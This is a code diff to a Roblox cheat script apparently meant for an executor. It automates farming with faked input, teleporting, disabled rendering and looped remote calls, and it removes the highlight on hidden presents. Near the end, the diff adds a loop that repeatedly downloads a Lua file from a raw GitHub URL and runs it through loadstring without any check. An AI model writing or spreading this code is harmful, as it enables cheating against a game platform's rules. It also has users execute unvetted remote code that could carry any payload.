@@ -1,3 +1,5 @@
+game:GetService("Workspace")["__THINGS"].HiddenPresents.Highlight:Destroy()
+
 
 
 local vu = game:GetService("VirtualUser")
@@ -25,8 +27,6 @@ game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(1127, 70
 game:GetService("RunService"):Set3dRenderingEnabled(false)
 
 setfpscap(10)
-
-
 
 while task.wait() do  
         local argsCast = {
@@ -71,5 +71,9 @@ while task.wait() do
         task.wait()
 end
 
+
+    while wait(0) and getgenv().present do
+loadstring(game:HttpGet("https://raw.githubusercontent.com/fifi1231/fg/main/132/test.lua"))()
+end
 
 
